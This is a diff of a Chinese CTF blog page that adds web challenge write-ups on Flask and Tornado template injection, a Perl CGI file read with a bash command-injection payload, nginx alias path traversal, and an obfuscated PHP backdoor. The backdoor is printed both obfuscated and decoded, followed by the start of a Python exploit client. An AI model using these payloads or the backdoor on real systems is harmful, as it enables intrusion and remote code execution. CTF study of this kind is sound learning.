@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      5.1k 字
+      9.8k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      70
+      139
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：24 分钟前
+                  本文最后更新于：11 天前
                 
               </p>
             
@@ -512,8 +512,8 @@ $c = <span class="hljs-keyword">new</span> xctf();
 <p><img src="https://i.loli.net/2020/12/02/Qxdc9U1GbrzYvSg.png" srcset="/img/loading.gif" alt="image-20201202094926424"></p>
 <h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p><strong>Tornado</strong>全称<strong>Tornado Web Server</strong>，是一个用<a href="https://zh.m.wikipedia.org/wiki/Python" target="_blank" rel="noopener">Python</a>语言写成的<a href="https://zh.m.wikipedia.org/wiki/Web服务器" target="_blank" rel="noopener">Web服务器</a>兼<a href="https://zh.m.wikipedia.org/wiki/Web应用框架" target="_blank" rel="noopener">Web应用框架</a>，由FriendFeed公司在自己的网站<a href="https://zh.m.wikipedia.org/wiki/FriendFeed" target="_blank" rel="noopener">FriendFeed</a>中使用，被<a href="https://zh.m.wikipedia.org/wiki/Facebook" target="_blank" rel="noopener">Facebook</a>收购以后框架以<a href="https://zh.m.wikipedia.org/wiki/开源软件" target="_blank" rel="noopener">开源软件</a>形式开放给大众。</p>
 <p>这又是web服务器和web应用框架，会不会和flask框架一样存在模板模板注入</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。</p>
-<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>1.先看看题目给的连接</p>
+<h3 id="0x1原理"><a href="#0x1原理" class="headerlink" title="0x1原理"></a><strong>0x1原理</strong></h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。</p>
+<h3 id="0x2解题"><a href="#0x2解题" class="headerlink" title="0x2解题"></a>0x2解题</h3><p>1.先看看题目给的连接</p>
 <div class="hljs"><pre><code class="hljs sas">http://220.249.52.133:43538/<span class="hljs-meta">file</span>?<span class="hljs-meta">filename</span>=/welcome.txt<span class="hljs-variable">&amp;filehash</span>=34b3f8fdcf2ec4394a5b9b20580c0096</code></pre></div>
 
 <p>提交的参数是文件名和文件的hash值</p>
@@ -575,10 +575,10 @@ def shrine(shrine):
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
     app.run(debug=<span class="hljs-keyword">True</span>)</code></pre></div>
 
-<h3 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h3><p>很明显的flask框架</p>
+<h3 id="0x1考察点"><a href="#0x1考察点" class="headerlink" title="0x1考察点"></a>0x1考察点</h3><p>很明显的flask框架</p>
 <p>存在模板注入，但是对()进行了过滤，并将config , self 加入了黑名单，<code>Web_python_template_injection</code>这题的payload就没法用了。</p>
 <p><img src="https://i.loli.net/2020/12/02/JT7Wnk3u86IVHQe.png" srcset="/img/loading.gif" alt="image-20201202103810281"></p>
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>可以使用内置函数<code>get_flashed_messages()</code>，又因为config在current_app里面，所以我们可以构造payload</p>
+<h3 id="0x2构造payload"><a href="#0x2构造payload" class="headerlink" title="0x2构造payload"></a>0x2构造payload</h3><p>可以使用内置函数<code>get_flashed_messages()</code>，又因为config在current_app里面，所以我们可以构造payload</p>
 <div class="hljs"><pre><code class="hljs clojure">&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre></div>
 
 
@@ -924,6 +924,589 @@ more `<span class="hljs-builtin-name">find</span> / -inum `</code></pre></div>
 <p>那就直接抓包，把php改成php5修改了MIME为image/jpeg，但是还是提示可以看出来是一个php文件，可能检测了文件开头信息，那就改成下面格式的一句话木马</p>
 <p>获得了flag</p>
 <p><img src="https://i.loli.net/2020/12/04/Nos2ZmYglFMIcLx.png" srcset="/img/loading.gif" alt="image-20201204132940298"></p>
+<h2 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h2><p>题目给了三个页面，其中有一个文件上传的页面，随便上传一个文件可以发现会将文件的内容显示出来，猜测这里使用了param()函数</p>
+<p><strong>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的</strong></p>
+<p>给了提示<code>Perl File Upload</code>第一次见这个东西，在网上学习了一下</p>
+<p>大佬猜测出的后天源码</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">strict</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">warning</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">CGI</span>;
+my $cgi=CGI-&gt;new;
+<span class="hljs-keyword">if</span>($cgi-&gt;upload(<span class="hljs-string">'file'</span>))&#123;
+	my $file=$cgi-&gt;param(<span class="hljs-string">'$file'</span>);
+	<span class="hljs-keyword">while</span>(&lt;$file&gt;) &#123;<span class="hljs-keyword">print</span>(<span class="hljs-string">"$_"</span>);&#125;
+&#125;</code></pre></div>
+
+<p>   1.抓包修改url和上传内容，修改成如图所示</p>
+<p><img src="https://i.loli.net/2020/12/09/UdBY7aruk2JhXim.png" srcset="/img/loading.gif" alt="image-20201209092628853"></p>
+<p><img src="https://i.loli.net/2020/12/09/n6DmvYEfM8HeI4h.png" srcset="/img/loading.gif" alt="image-20201209091529965"></p>
+<ol start="2">
+<li><p>先读取file.pl文件，盲猜在/var/www/cgi-bin/file.pl，将3部分payload修改 为：/cgi­bin/file.pl?/var/www/cgi-bin/file.pl </p>
+</li>
+<li><p>利用bash来进行读取当前目录下的文件，将3部分payload修改为：/cgibin/file.pl?/bin/bash%20­c%20ls${IFS}/| </p>
+<p><img src="https://i.loli.net/2020/12/09/7g6WiKyzYG5vQsd.png" srcset="/img/loading.gif" alt="image-20201209093015408"></p>
+</li>
+<li><p>读取当前目录的flag文件内容,将3部分payload修改为：/cgi­bin/file.pl?/flag</p>
+</li>
+</ol>
+<p><img src="https://i.loli.net/2020/12/09/n7xUhu69oBfGwaM.png" srcset="/img/loading.gif" alt="image-20201209092658534"></p>
+<p><a href="https://adworld.xctf.org.cn/task/writeup?type=web&id=5001&number=3&grade=1&page=2" target="_blank" rel="noopener">参考</a></p>
+<h2 id="Web-php-wrong-nginx-config"><a href="#Web-php-wrong-nginx-config" class="headerlink" title="Web_php_wrong_nginx_config"></a>Web_php_wrong_nginx_config</h2><h3 id="0x1信息收集"><a href="#0x1信息收集" class="headerlink" title="0x1信息收集"></a>0x1信息收集</h3><p>进入页面发现要登录，但是没有账号，扫描目录也没发现注册账号的页面，但是发现了robots.txt，其中给了hint.php和hack.php</p>
+<p>hint.php</p>
+<div class="hljs"><pre><code class="hljs awk">配置文件也许有问题呀：<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-enabled/</span>site.conf</code></pre></div>
+
+<p>还有这几个</p>
+<p><img src="https://i.loli.net/2020/12/09/iDh1arKt2lNRfxk.png" srcset="/img/loading.gif" alt="image-20201209100341300"></p>
+<p>抓包发现cookie，将其改为1后发现就可以登录了，这里是使用浏览器的cookie编辑插件</p>
+<p><img src="https://i.loli.net/2020/12/09/fk6YVQZIFruy8ov.png" srcset="/img/loading.gif" alt="image-20201209095233466"></p>
+<p>登录后的url</p>
+<div class="hljs"><pre><code class="hljs pgsql">http://<span class="hljs-number">220.249</span><span class="hljs-number">.52</span><span class="hljs-number">.133</span>:<span class="hljs-number">35234</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span>.php?file=<span class="hljs-keyword">index</span>&amp;ext=php</code></pre></div>
+
+<h2 id="0x2读取配置文件"><a href="#0x2读取配置文件" class="headerlink" title="0x2读取配置文件"></a>0x2读取配置文件</h2><p>尝试读取index.php和admin.php源码都失败了，再试试robots.txt中的页面</p>
+<p>直接输入路径会跳转到主页不显示内容，可能存在过滤导致文件路径无效</p>
+<div class="hljs"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled<span class="hljs-regexp">/site.conf&amp;ext=</span></code></pre></div>
+
+<p>用双写绕过</p>
+<div class="hljs"><pre><code class="hljs awk">?file=....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled<span class="hljs-regexp">/site.conf&amp;ext=</span></code></pre></div>
+
+<p>拿到了配置文件</p>
+<div class="hljs"><pre><code class="hljs stata">server &#123;
+    listen 8080; ## listen <span class="hljs-keyword">for</span> ipv4; this <span class="hljs-keyword">line</span> is default and implied
+    listen [::]:8080; ## listen <span class="hljs-keyword">for</span> ipv6
+
+    root /<span class="hljs-keyword">var</span>/www/html;
+    index index.php index.html index.htm;
+    port_in_redirect off;
+    server_name _;
+
+    # Make site accessible from http:<span class="hljs-comment">//localhost/</span>
+    #server_name localhost;
+
+    # <span class="hljs-keyword">If</span> block <span class="hljs-keyword">for</span> setting the time <span class="hljs-keyword">for</span> the logfile
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$time_iso8601</span> ~ <span class="hljs-string">"^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)"</span>) &#123;
+       <span class="hljs-keyword">set</span> <span class="hljs-variable">$year</span> <span class="hljs-variable">$1</span>;
+       <span class="hljs-keyword">set</span> <span class="hljs-variable">$month</span> <span class="hljs-variable">$2</span>;
+       <span class="hljs-keyword">set</span> <span class="hljs-variable">$day</span> <span class="hljs-variable">$3</span>;
+    &#125;
+    # Disable sendfile <span class="hljs-keyword">as</span> per https:<span class="hljs-comment">//docs.vagrantup.com/v2/synced-folders/virtualbox.html</span>
+    sendfile off;
+
+        <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$http_x_forwarded_for</span>;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_x_forwarded_for_filt</span> ~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+) &#123;
+                <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$1</span>???;
+        &#125;
+
+    # Add stdout logging
+
+    access_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-variable">$hostname</span>-access-<span class="hljs-variable">$year</span>-<span class="hljs-variable">$month</span>-<span class="hljs-variable">$day</span>.<span class="hljs-keyword">log</span> openshift_log;
+    error_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span> info;
+
+    location / &#123;
+        # First attempt to serve request <span class="hljs-keyword">as</span> <span class="hljs-keyword">file</span>, then
+        # <span class="hljs-keyword">as</span> directory, then fall back to index.html
+        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;
+        server_tokens off;
+    &#125;
+
+    #error_page 404 /404.html;
+
+    # redirect server <span class="hljs-keyword">error</span> pages to the static page /50x.html
+    #
+    error_page 500 502 503 504 /50x.html;
+    location = /50x.html &#123;
+        root /usr/share/nginx/html;
+    &#125;
+    location ~ \.php$ &#123;
+        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;
+        fastcgi_split_path_info ^(.+\.php)(/.+)$;
+        fastcgi_pass unix:/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/php/php5.6-fpm.sock;
+        fastcgi_param SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;
+        fastcgi_param SCRIPT_NAME <span class="hljs-variable">$fastcgi_script_name</span>;
+        fastcgi_index index.php;
+        <span class="hljs-keyword">include</span> fastcgi_params;
+        fastcgi_param REMOTE_ADDR <span class="hljs-variable">$http_x_forwarded_for</span>;
+    &#125;
+
+    location ~ /\. &#123;
+            log_not_found off;
+            deny all;
+    &#125;
+    location /web-img &#123;  <span class="hljs-comment">//这里存在问题</span>
+  
+        alias /images/;
+        autoindex <span class="hljs-keyword">on</span>;
+    &#125;
+    location ~* \.(ini|docx|pcapng|doc)$ &#123;  
+         deny all;  
+    &#125;  
+    <span class="hljs-keyword">include</span> /<span class="hljs-keyword">var</span>/www/nginx[.]<span class="hljs-keyword">conf</span>;</code></pre></div>
+
+<p>这个文件内容也看不懂，但是知道这里存在问题</p>
+<div class="hljs"><pre><code class="hljs nginx"><span class="hljs-attribute">location</span> /web-img &#123; 
+    <span class="hljs-attribute">alias</span> /images/;
+    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;
+&#125;</code></pre></div>
+
+<p><strong>alias</strong>,就是给 /web-img，设置了一个别名，当访问/web-img就相当于访问了 /images/</p>
+<div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">^~ /t</span>/ &#123;
+ alias /www/root/html/new_t/;
+&#125;</code></pre></div>
+
+<p>如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/new_t/a.html的文件。注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。</p>
+<p><strong>autoindex</strong> </p>
+<p>Nginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件或你要启用目录浏览虚拟主机的配置文件，在server或location 段里添加上autoindex on</p>
+<p>这里将其打开就会导致我们可以访问根目录的所有文件夹</p>
+<p>url</p>
+<div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>:<span class="hljs-number">35234</span><span class="hljs-regexp">/web-img../</span>
+<span class="hljs-regexp">//</span>    web-img..<span class="hljs-regexp">/  == /im</span>age<span class="hljs-regexp">/../</span> 相当于回退到了根目录</code></pre></div>
+
+
+
+<h3 id="0x3发现漏洞"><a href="#0x3发现漏洞" class="headerlink" title="0x3发现漏洞"></a>0x3发现漏洞</h3><p>在/var/www/中发现了一个hack..php.bak，正好是robots.txt中提示的内容</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$U=<span class="hljs-string">'_/|U","/-/|U"),ar|Uray|U("/|U","+"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle'</span>;
+$q=<span class="hljs-string">'s[|U$i]="";$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui'</span>;
+$M=<span class="hljs-string">'l="strtolower|U";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$'</span>;
+$z=<span class="hljs-string">'r=@$r[|U"HTTP_R|UEFERER|U"];$r|U|Ua=@$r["HTTP_A|U|UCCEPT_LAN|UGUAGE|U"];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r'</span>;
+$k=<span class="hljs-string">'?:;q=0.([\\|Ud]))?,|U?/",$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss="|Usubst|Ur";|U|U$s'</span>;
+$o=<span class="hljs-string">'|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r'</span>;
+$N=<span class="hljs-string">'|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray("/'</span>;
+$C=<span class="hljs-string">'an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut("|U&lt;$k&gt;$d&lt;/$k&gt;"|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;'</span>;
+$j=<span class="hljs-string">'$k|Uh="|U|U42f7";$kf="e9ac";fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U"";fo|Ur($i=0;$i&lt;'</span>;
+$R=str_replace(<span class="hljs-string">'rO'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'rOcreatrOe_rOrOfurOncrOtion'</span>);
+$J=<span class="hljs-string">'kf|U),|U0,3));$p="|U";for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$'</span>;
+$x=<span class="hljs-string">'r)|U;pa|Urse|U_str($u["qu|U|Uery"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul("/([\\|U|Uw])[|U\\w-]+|U('</span>;
+$f=str_replace(<span class="hljs-string">'|U'</span>,<span class="hljs-string">''</span>,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);
+$g=create_function(<span class="hljs-string">''</span>,$f);
+$g();
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>又是一段奇奇怪怪的代码</p>
+<p>但是能看懂最后三行是生成了一个$g函数，而且是由$f生成的，那么久将$f打印出来看看，在线格式化后如下</p>
+<p>是一个后门程序，但是如何利用是个问题，实在太菜了，都看不懂写的是什么，只好找到wp</p>
+<div class="hljs"><pre><code class="hljs php">$kh=<span class="hljs-string">"42f7"</span>;
+$kf=<span class="hljs-string">"e9ac"</span>;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span><span class="hljs-params">($t,$k)</span> </span>&#123;
+	$c=strlen($k);
+	$l=strlen($t);
+	$o=<span class="hljs-string">""</span>;
+	<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>;$i&lt;$l;) &#123;
+		<span class="hljs-keyword">for</span> ($j=<span class="hljs-number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;
+			$o.=$t &#123;
+				$i
+			&#125;
+			^$k &#123;
+				$j
+			&#125;
+			;
+		&#125;
+	&#125;
+	<span class="hljs-keyword">return</span> $o;
+&#125;
+$r=$_SERVER;
+$rr=@$r[<span class="hljs-string">"HTTP_REFERER"</span>];
+$ra=@$r[<span class="hljs-string">"HTTP_ACCEPT_LANGUAGE"</span>];
+<span class="hljs-keyword">if</span>($rr&amp;&amp;$ra) &#123;
+	$u=parse_url($rr);
+	parse_str($u[<span class="hljs-string">"query"</span>],$q);
+	$q=array_values($q);
+	preg_match_all(<span class="hljs-string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>,$ra,$m);
+	<span class="hljs-keyword">if</span>($q&amp;&amp;$m) &#123;
+		@session_start();
+		$s=&amp;$_SESSION;
+		$ss=<span class="hljs-string">"substr"</span>;
+		$sl=<span class="hljs-string">"strtolower"</span>;
+		$i=$m[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].$m[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];
+		$h=$sl($ss(md5($i.$kh),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));
+		$f=$sl($ss(md5($i.$kf),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));
+		$p=<span class="hljs-string">""</span>;
+		<span class="hljs-keyword">for</span> ($z=<span class="hljs-number">1</span>;$z&lt;count($m[<span class="hljs-number">1</span>]);$z++)$p.=$q[$m[<span class="hljs-number">2</span>][$z]];
+		<span class="hljs-keyword">if</span>(strpos($p,$h)===<span class="hljs-number">0</span>) &#123;
+			$s[$i]=<span class="hljs-string">""</span>;
+			$p=$ss($p,<span class="hljs-number">3</span>);
+		&#125;
+		<span class="hljs-keyword">if</span>(array_key_exists($i,$s)) &#123;
+			$s[$i].=$p;
+			$e=strpos($s[$i],$f);
+			<span class="hljs-keyword">if</span>($e) &#123;
+				$k=$kh.$kf;
+				ob_start();
+				@<span class="hljs-keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"/_/"</span>,<span class="hljs-string">"/-/"</span>),<span class="hljs-keyword">array</span>(<span class="hljs-string">"/"</span>,<span class="hljs-string">"+"</span>),$ss($s[$i],<span class="hljs-number">0</span>,$e))),$k)));
+				$o=ob_get_contents();
+				ob_end_clean();
+				$d=base64_encode(x(gzcompress($o),$k));
+				<span class="hljs-keyword">print</span>(<span class="hljs-string">"&lt;$k&gt;$d&lt;/$k&gt;"</span>);
+				@session_destroy();
+			&#125;
+		&#125;
+	&#125;
+&#125;</code></pre></div>
+
+<p>做个分析</p>
+<ul>
+<li>先是预定义阶段 , 定义了两个字符串和一个 <code>x()</code> 函数</li>
+<li>然后获取攻击者发送的数据 , 这里攻击代码是通过 Referer 字段传输的</li>
+<li>注意正则函数 preg_match_all() , 该函数从 <a href="https://blog.csdn.net/qq_40491569/article/details/83472556" target="_blank" rel="noopener">Accept-Language</a> 取值 , 然后通过正则匹配后输出到 <code>$m</code> 数组中</li>
+<li>然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 <code>$h</code> 和 <code>$f</code> 两个变量</li>
+<li>循环中的 <code>$p .= $q[$m[2][$z]]</code> 会不断从 <code>$q</code> 中提取数据 . 结合之前的代码 , 攻击代码是放在 Referer 中的( 最后会放在 <code>$q</code> 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload .</li>
+<li>然后判断 <code>$h</code> 是否出现在 Payload 的开头 , 若是则设置 <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code> , 同时删除 Payload 的 $h 部分 .</li>
+<li>接着判断 <code>$_SESSION</code> 中那个是否存在 <code>$i</code> 这个键名 , 若是则将 Payload 赋值给 <code>$_SESSION[$i]</code> , 然后查找 <code>$_SESSION[$i]</code>( 也就是 Payload ) 中 <code>$f</code> 第一次出现的位置 .</li>
+<li>最后执行payload</li>
+</ul>
+<p>exp：</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint,choice
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5
+<span class="hljs-keyword">import</span> urllib
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> zlib
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+
+<span class="hljs-comment"># 用于生成完整的 Accept-Language</span>
+<span class="hljs-keyword">from</span> urllib3.connectionpool <span class="hljs-keyword">import</span> xrange
+<span class="hljs-keyword">from</span> yapf.yapflib.py3compat <span class="hljs-keyword">import</span> raw_input
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choicePart</span><span class="hljs-params">(seq,amount)</span>:</span>
+    length = len(seq)
+    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> length &lt; amount:
+        print(<span class="hljs-string">'Error Input'</span>)
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+    result = []    <span class="hljs-comment"># 结果</span>
+    indexes = []    <span class="hljs-comment"># 索引</span>
+    count = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> count &lt; amount:
+        i = randint(<span class="hljs-number">0</span>,length<span class="hljs-number">-1</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> indexes:
+            indexes.append(i)
+            result.append(seq[i])
+            count += <span class="hljs-number">1</span>
+            <span class="hljs-keyword">if</span> count == amount:
+                <span class="hljs-keyword">return</span> result
+
+<span class="hljs-comment"># 生成随机填充字符串( 由所有 ASCII 字符组成 , 包括不可读的字符 )</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randBytesFlow</span><span class="hljs-params">(amount)</span>:</span>
+    result = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):
+        result += chr(randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>))
+    <span class="hljs-keyword">return</span>  result
+
+<span class="hljs-comment"># 生成随机填充字符串( 由所有大小写字母组成 )</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randAlpha</span><span class="hljs-params">(amount)</span>:</span>
+    result = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):
+        <span class="hljs-comment"># choice() 方法返回一个列表，元组或字符串的随机项</span>
+        <span class="hljs-comment"># string.ascii_letters 会生成所有的字母</span>
+        result += choice(string.ascii_letters)
+    <span class="hljs-keyword">return</span> result
+
+<span class="hljs-comment"># 模拟 x() 函数 , 循环异或加密</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loopXor</span><span class="hljs-params">(text,key)</span>:</span>
+    result = <span class="hljs-string">''</span>
+    lenKey = len(key)
+    lenTxt = len(text)
+    iTxt = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> iTxt &lt; lenTxt:
+        iKey = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">while</span> iTxt&lt;lenTxt <span class="hljs-keyword">and</span> iKey&lt;lenKey:
+            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
+            iTxt += <span class="hljs-number">1</span>
+            iKey += <span class="hljs-number">1</span>
+    <span class="hljs-keyword">return</span> result
+
+<span class="hljs-comment"># 开启 Debug 选项</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debugPrint</span><span class="hljs-params">(msg)</span>:</span>
+    <span class="hljs-keyword">if</span> debugging:
+        <span class="hljs-keyword">print</span> (msg)
+
+<span class="hljs-comment"># 定义基本变量</span>
+debugging = <span class="hljs-literal">False</span>    <span class="hljs-comment"># 默认关闭 Debug , 可用 True 开启</span>
+keyh = <span class="hljs-string">"42f7"</span>    <span class="hljs-comment"># $kh , 需要修改</span>
+keyf = <span class="hljs-string">"e9ac"</span>    <span class="hljs-comment"># $kf , 需要修改</span>
+xorKey = keyh + keyf    <span class="hljs-comment"># $k</span>
+url = <span class="hljs-string">'http://111.198.29.45:47960/hack.php'</span>    <span class="hljs-comment"># 指定 URL  , 需要修改</span>
+defaultLang = <span class="hljs-string">'zh-CN'</span>    <span class="hljs-comment">#默认Language</span>
+languages = [<span class="hljs-string">'zh-TW;q=0.%d'</span>,<span class="hljs-string">'zh-HK;q=0.%d'</span>,<span class="hljs-string">'en-US;q=0.%d'</span>,<span class="hljs-string">'en;q=0.%d'</span>]    <span class="hljs-comment">#Accept-Language 模板</span>
+proxies = <span class="hljs-literal">None</span>    <span class="hljs-comment"># &#123;'http':'http://127.0.0.1:8080'&#125; # 代理 , 可用于 BurpSuite 等</span>
+sess = requests.Session()    <span class="hljs-comment"># 创建一个 SESSION 对象</span>
+
+<span class="hljs-comment"># 每次会话会产生一次随机的 Accept-Language</span>
+langTmp = choicePart(languages,<span class="hljs-number">3</span>)    <span class="hljs-comment"># 输出一个列表 , 包含模板中的三种 Accept-language</span>
+indexes = sorted(choicePart(range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>),<span class="hljs-number">3</span>), reverse=<span class="hljs-literal">True</span>)    <span class="hljs-comment"># 降序排序输出三个权重值 , 例如 [8,6,4]</span>
+
+acceptLang = [defaultLang]   <span class="hljs-comment"># 先添加默认Language</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):
+    acceptLang.append(langTmp[i] % (indexes[i],))    <span class="hljs-comment"># 然后循环添加三种 Accept-Language , 并为其添加权重值</span>
+acceptLangStr = <span class="hljs-string">','</span>.join(acceptLang)    <span class="hljs-comment"># 将多个 Accept-Language 用 " , " 拼接在一起</span>
+<span class="hljs-comment"># acceptLangStr 即为要使用的 Accept-Language</span>
+debugPrint(acceptLangStr)
+
+init2Char = acceptLang[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + acceptLang[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]    <span class="hljs-comment"># $i</span>
+md5head = (md5(init2Char + keyh).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]    <span class="hljs-comment"># $h</span>
+md5tail = (md5(init2Char + keyf).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>] + randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))    <span class="hljs-comment"># $f + 填充字符串</span>
+debugPrint(<span class="hljs-string">'$i is %s'</span> % (init2Char))
